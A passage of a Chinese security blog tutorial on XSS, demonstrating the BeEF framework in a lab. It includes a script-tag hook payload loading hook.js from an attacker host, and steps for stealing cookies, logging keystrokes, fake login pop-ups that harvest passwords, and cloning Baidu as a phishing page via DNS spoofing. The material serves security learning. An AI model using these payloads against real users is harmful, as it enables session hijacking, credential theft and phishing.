客户端：运行与客户端浏览器的 js 脚本，也就是 beef 生成的 payload；
beef 将运行了 hook 的 web 浏览器钩住，进行管理
</code></pre>
<h4 id="15-2-攻击手段">15.2 攻击手段</h4>
<p>配合xss，将hook插入到存在xss的注入处；<br>
直接诱使客户端访问含有 hook 的伪造站点；<br>
结合中间人攻击注入 hook 脚本</p>
<p>用途：键盘记录器、网络扫描、浏览器信息收集、绑定 shell、与 metasploit 集成等</p>
<h4 id="15-3-靶场演示">15.3 靶场演示</h4>
<p>安装包:<a target="_blank" rel="noopener" href="https://gitlab.com/kalilinux/packages/beef-xss">https://gitlab.com/kalilinux/packages/beef-xss</a></p>
<p>终端输入beef-xss启动，登录web页面：</p>
<p>账户:beef;密码:bcx123</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230615185617829.png" alt="image-20230615185617829"></p>
<p>专有名词:</p>
<pre><code class="hljs plaintext">Hocked Browers：

    online browers 在线浏览器
    offline browers 离线浏览器
    登录成功后，这里会显示在线的主机和不在线的主机。在线的就是现在该主机浏览器执行了我们的JS脚本代码，不在线的就是该主机曾经执行过我们的JS脚本代码，但是现在叉掉了该页面


Detials：

    浏览器、插件版本信息，操作系统信息

Logs：

    浏览器动作：焦点变化，鼠标单击，信息输入

commands：

    绿色模块：表示模块适用当前用户，并且执行结果对用户不可见
    红色模块：表示模块不适用当前用户，有些红色模块也可以执行
    橙色模块：模块可用，但结果对用户可见
    灰色模块：模块为在目标浏览器上测试过
    
另一个解释的版本:

	绿色的代表该功能有效，并且执行不会被用户所发现

	橙色的代表该功能有效，但是执行会被用户所发现

	白色的代表该功能不确定是否有效

	红色的代表该功能无效</code></pre>
<p>构造payload插入注入点：</p>
<pre><code class="hljs plaintext">&lt;script src=&quot;http://192.168.4.212:3000/hook.js&quot;&gt;&lt;/script&gt;</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230615190225643.png" alt="image-20230615190225643"></p>
<p>提交后靶机的浏览器就被勾住了</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230615190155329.png" alt="image-20230615190155329"></p>
<h4 id="15-4-BeEF管理">15.4 BeEF管理</h4>
<p>Detailes模块是浏览器、插件版本信息，操作系统信息：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230615190304167.png" alt="image-20230615190304167"></p>
<p>Logs模块可以查看鼠标点击，键盘输入的一些操作：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230615190343645.png" alt="image-20230615190343645"></p>
<p>commands模块可以对目标系统进行入侵：</p>
<p><strong>1.create Alert Dialog可以在目标系统上弹窗</strong></p>
<p>离谱的是我一直点击没反应,于是我怀疑是百度翻译的锅,果不其然啊…</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230615192005502.png" alt="image-20230615192005502"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230615190915568.png" alt="image-20230615190915568"></p>
<p><strong>2.获取用户Cookie</strong></p>
<p>我们点击Browser—&gt;Hooked Domain —&gt;Get Cookie，然后点击右下角的Execute</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230615192044762.png" alt="image-20230615192044762"></p>
<p>然后点击我们执行的那条命令，右边就可以看到浏览器的 Cookie 了。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230615192119271.png" alt="image-20230615192119271"></p>
<p><strong>3.网页重定向</strong></p>
<p>我们点击Browser—&gt;Hooked Domain —&gt;Redirect Browser，然后点击右下角的Execute，然后用户的浏览器的该页面就会跳转到百度的页面了。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230615192224620.png" alt="image-20230615192224620"></p>
<p>我果然跳转了</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230615192239183.png" alt="image-20230615192239183"></p>
<p><strong>4.社工弹窗</strong></p>
<p>我们点击Social Engiineering——&gt;Pretty Theft ，然后右上角选择弹窗的类型，右下角点击 Execute</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230615192359743.png" alt="image-20230615192359743"></p>
<p>然后浏览器那边就会弹出框，如果你在框内输入了用户名和密码的话</p>
<p>前提是该受害者还未关闭当前页面</p>
<p>如果用户输入了用户名和密码，点击了Log in的话，我们后台是可以收到密码的</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230615192759774.png" alt="image-20230615192759774"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230615192858584.png" alt="image-20230615192858584"></p>
<p><strong>5.钓鱼网站(结合DNS欺骗)</strong></p>
<p>进入/usr/share/beef-xss/ 目录下，执行命令：<strong>./beef</strong>　启动 beef ，API Token值</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230615193044908.png" alt="image-20230615193044908"></p>
<p>新打开一个页面，执行下面的命令</p>
<pre><code class="hljs plaintext">curl -H &quot;Content-Type: application/json; charset=UTF-8&quot; -d &#x27;&#123;&quot;url&quot;:&quot;https://www.baidu.com/&quot;,&quot;mount&quot;:&quot;/&quot;&#125;&#x27; -X POST http://192.168.4.212:3000/api/seng/clone_page?token=6281dff63d7c43e2ba76b3900d1a65de05a35770   #这里的地址token是我们上一步获取到的token</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230615193231941.png" alt="image-20230615193231941"></p>
<p>我们克隆的网站在目录：/usr/share/beef-xss/extensions/social_engineering/web_cloner/cloned_pages 下</p>
<p>很遗憾我这里显示不了,就先看个思路吧</p>
<p>我们访问：<a target="_blank" rel="noopener" href="http://192.168.4.212:3000/">http://192.168.4.212:3000/</a> ， 可以看到和百度一模一样。只要别人访问了该链接，这个浏览器就可以被我们控制了！</p>
<p>这里就借用别人的图片了</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230615193846749.png" alt="image-20230615193846749"></p>
<p>那么，如何让其他人访问我们的这个链接呢？我们可以结合DNS欺骗，将百度的地址解析到我们的这个链接上，这样，别人访问百度的时候就自动跳转到我们的这个页面了？</p>
<p>进行DNS欺骗之前，先去配置文件中把3000端口改成80端口</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230615193938966.png" alt="image-20230615193938966"></p>
<p>然后利用bettercap进行DNS欺骗。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230615193947420.png" alt="image-20230615193947420"></p>
<p>然后重新打开beef，然后克隆www.baidu.com网站</p>
<p><a target="_blank" rel="noopener" href="http://xn--www-g88dw3xuk5a03fumy5k1be0btuk3s9a8wm.baidu.com">只要被欺骗的主机访问www.baidu.com</a>，其实跳转到了我们克隆的网站。这里百度的图片没加载出来，有点尴尬。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230615193959786.png" alt="image-20230615193959786"></p>
<p>这里就先这样吧,日后进阶更深的command在看如下文章</p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/178512.html">https://www.freebuf.com/sectool/178512.html</a></p>
<p>不得不说这工具感情好啊，那xssplatform感觉很逊，不知道日后有啥亮眼的呢</p>
<h4 id="15-5-联合Metasploit">15.5 联合Metasploit</h4>
<p><a target="_blank" rel="noopener" href="https://blog.51cto.com/u_15183497/2737453">https://blog.51cto.com/u_15183497/2737453</a></p>
</script></p>
<div class="article-footer fs14">
    <section id="license">
      <div class="header"><span>许可协议</span></div>
      <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
</div>
    </section>
    </div>
</article>
<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/2023/08/07/qian-xi-wen-jian-bao-han/">浅析文件包含</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2023/08/06/newscenter/">攻防世界-NewsCenter</a></div></section></div>




  <div class="related-wrap md-text" id="comments">
    <section class='header cmt-title cap theme'>
      <p>感谢大佬们的不吝赐教！</p>

    </section>
    <section class='body cmt-body twikoo'>
      

<div id="twikoo_container"><svg class="loading" style="vertical-align:middle;fill:currentColor;overflow:hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2709"><path d="M832 512c0-176-144-320-320-320V128c211.2 0 384 172.8 384 384h-64zM192 512c0 176 144 320 320 320v64C300.8 896 128 723.2 128 512h64z" p-id="2710"></path></svg></div>
    </section>
  </div>



<footer class="page-footer footnote"><hr><div class="text"><p><span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span></p>
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<p>本站由 <a href="/">hybcx</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.28.1">Stellar 1.28.1</a> 主题创建。<br>
本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
</div></footer>
<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
<div class="widgets">



<widget class="widget-wrapper toc" id="data-toc" collapse="true"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#xss%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93"><span class="toc-text">XSS注入总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80-xss%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-text">一、XSS漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C-xss%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%8D%B1%E5%AE%B3"><span class="toc-text">二、XSS漏洞的危害</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89-xss%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%86%E7%B1%BB"><span class="toc-text">三、XSS漏洞的分类</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%8F%8D%E5%B0%84%E5%9E%8Bxss"><span class="toc-text">1、反射型XSS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%AD%98%E5%82%A8%E5%9E%8Bxss"><span class="toc-text">2、存储型XSS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-dom%E5%9E%8Bxss"><span class="toc-text">3、DOM型XSS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E5%88%A4%E6%96%AD%E6%98%AF%E5%93%AA%E4%B8%80%E7%A7%8Dxss"><span class="toc-text">4、判断是哪一种XSS</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9B-xss%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%A3%80%E6%B5%8B%E4%B8%8E%E9%98%B2%E5%BE%A1"><span class="toc-text">四、XSS漏洞的检测与防御</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%A3%80%E6%B5%8B"><span class="toc-text">1、检测</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E9%98%B2%E5%BE%A1"><span class="toc-text">2、防御</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#1%E5%9F%BA%E4%BA%8E%E5%AD%98%E5%82%A8%E5%9E%8B%E7%9A%84xss%E6%94%BB%E5%87%BB"><span class="toc-text">1.基于存储型的XSS攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E6%97%A0csp%E4%BF%9D%E6%8A%A4%E4%B8%8B%E7%9A%84xss"><span class="toc-text">0x01 无CSP保护下的XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E7%9B%B4%E6%8E%A5%E5%B5%8C%E5%85%A5%E5%9E%8B"><span class="toc-text">1.直接嵌入型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2import%E5%AF%BC%E5%85%A5%E5%9E%8B"><span class="toc-text">2.import导入型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3script%E5%AF%BC%E5%85%A5%E5%9E%8B"><span class="toc-text">3.script导入型</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E6%9C%89csp%E4%BF%9D%E6%8A%A4%E4%B8%8B%E7%9A%84xss"><span class="toc-text">0x02 有CSP保护下的XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5"><span class="toc-text">1.内容安全策略</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-csp%E7%AD%96%E7%95%A5"><span class="toc-text">（1） CSP策略</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%B8%B8%E7%94%A8%E7%9A%84%E7%AD%96%E7%95%A5%E6%8C%87%E4%BB%A4"><span class="toc-text">（2） 常用的策略指令</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%86%85%E5%AE%B9%E6%BA%90"><span class="toc-text">内容源</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E8%B7%B3%E8%BD%AC"><span class="toc-text">2.跳转</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#meta%E6%A0%87%E7%AD%BE%E8%B7%B3%E8%BD%AC"><span class="toc-text">meta标签跳转</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#script%E8%84%9A%E6%9C%AC%E8%B7%B3%E8%BD%AC"><span class="toc-text">script脚本跳转</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#prefetch%E9%A2%84%E5%8A%A0%E8%BD%BD%E7%BB%95%E8%BF%87"><span class="toc-text">prefetch预加载绕过</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-xss%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7"><span class="toc-text">0x03 XSS绕过技巧</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E5%AE%9E%E4%BE%8B%E8%A7%A3%E6%9E%90"><span class="toc-text">0x04 实例解析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x1-htcf-guestbook"><span class="toc-text">0x1 htcf guestbook</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E8%B7%B3%E8%BD%AC%E7%BB%95%E8%BF%87"><span class="toc-text">1.跳转绕过：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2chrome%E5%AF%B9csp%E6%94%AF%E6%8C%81%E7%9A%84%E4%B8%8D%E5%AE%8C%E6%95%B4%E7%BB%95%E8%BF%87-%E9%A2%84%E5%8A%A0%E8%BD%BD%E7%BB%95%E8%BF%87"><span class="toc-text">2.chrome对CSP支持的不完整绕过 预加载绕过</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-0ctf-simplexss"><span class="toc-text">0x05 0ctf simplexss</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#51-%E5%B8%B8%E8%A7%81%E6%A0%87%E7%AD%BE%E5%8F%8A%E5%B1%9E%E6%80%A7"><span class="toc-text">5.1 常见标签及属性</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#scirpt-%E6%A0%87%E7%AD%BE"><span class="toc-text">scirpt 标签</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81"><span class="toc-text">漏洞验证</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E7%9A%84%E7%9B%B8%E5%85%B3%E6%A6%82%E5%BF%B5"><span class="toc-text">1、漏洞验证的相关概念</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E7%9B%B8%E5%85%B3%E6%A6%82%E5%BF%B5%E4%B9%8B%E9%97%B4%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-text">2、漏洞验证相关概念之间的区别</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E5%B8%B8%E8%A7%81%E7%9A%84poc"><span class="toc-text">3、常见的POC</span></a></li></ol></li></ol></li></ol></li></ol></div><div class="widget-footer">

<a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 12c0-4.714 0-7.071 1.464-8.536C4.93 2 7.286 2 12 2c4.714 0 7.071 0 8.535 1.464C22 4.93 22 7.286 22 12c0 4.714 0 7.071-1.465 8.535C19.072 22 16.714 22 12 22s-7.071 0-8.536-1.465C2 19.072 2 16.714 2 12Z"/><path stroke-linecap="round" stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/></g></svg><span>回到顶部</span></a><a class="buttom" onclick="util.scrollComment()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M10.46 1.25h3.08c1.603 0 2.86 0 3.864.095c1.023.098 1.861.3 2.6.752a5.75 5.75 0 0 1 1.899 1.899c.452.738.654 1.577.752 2.6c.095 1.004.095 2.261.095 3.865v1.067c0 1.141 0 2.036-.05 2.759c-.05.735-.153 1.347-.388 1.913a5.75 5.75 0 0 1-3.112 3.112c-.805.334-1.721.408-2.977.43a10.81 10.81 0 0 0-.929.036c-.198.022-.275.054-.32.08c-.047.028-.112.078-.224.232c-.121.166-.258.396-.476.764l-.542.916c-.773 1.307-2.69 1.307-3.464 0l-.542-.916a10.605 10.605 0 0 0-.476-.764c-.112-.154-.177-.204-.224-.232c-.045-.026-.122-.058-.32-.08c-.212-.023-.49-.03-.93-.037c-1.255-.021-2.171-.095-2.976-.429A5.75 5.75 0 0 1 1.688 16.2c-.235-.566-.338-1.178-.389-1.913c-.049-.723-.049-1.618-.049-2.76v-1.066c0-1.604 0-2.86.095-3.865c.098-1.023.3-1.862.752-2.6a5.75 5.75 0 0 1 1.899-1.899c.738-.452 1.577-.654 2.6-.752C7.6 1.25 8.857 1.25 10.461 1.25M6.739 2.839c-.914.087-1.495.253-1.959.537A4.25 4.25 0 0 0 3.376 4.78c-.284.464-.45 1.045-.537 1.96c-.088.924-.089 2.11-.089 3.761v1c0 1.175 0 2.019.046 2.685c.045.659.131 1.089.278 1.441a4.25 4.25 0 0 0 2.3 2.3c.515.214 1.173.294 2.429.316h.031c.398.007.747.013 1.037.045c.311.035.616.104.909.274c.29.17.5.395.682.645c.169.232.342.525.538.856l.559.944a.52.52 0 0 0 .882 0l.559-.944c.196-.331.37-.624.538-.856c.182-.25.392-.476.682-.645c.293-.17.598-.24.909-.274c.29-.032.639-.038 1.037-.045h.032c1.255-.022 1.913-.102 2.428-.316a4.25 4.25 0 0 0 2.3-2.3c.147-.352.233-.782.278-1.441c.046-.666.046-1.51.046-2.685v-1c0-1.651 0-2.837-.089-3.762c-.087-.914-.253-1.495-.537-1.959a4.25 4.25 0 0 0-1.403-1.403c-.464-.284-1.045-.45-1.96-.537c-.924-.088-2.11-.089-3.761-.089h-3c-1.651 0-2.837 0-3.762.089" clip-rule="evenodd"/><path fill="currentColor" d="M9 11a1 1 0 1 1-2 0a1 1 0 0 1 2 0m4 0a1 1 0 1 1-2 0a1 1 0 0 1 2 0m4 0a1 1 0 1 1-2 0a1 1 0 0 1 2 0"/></svg><span>参与讨论</span></a></div></widget>
</div></aside><div class='float-panel blur'>
  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
  </button>
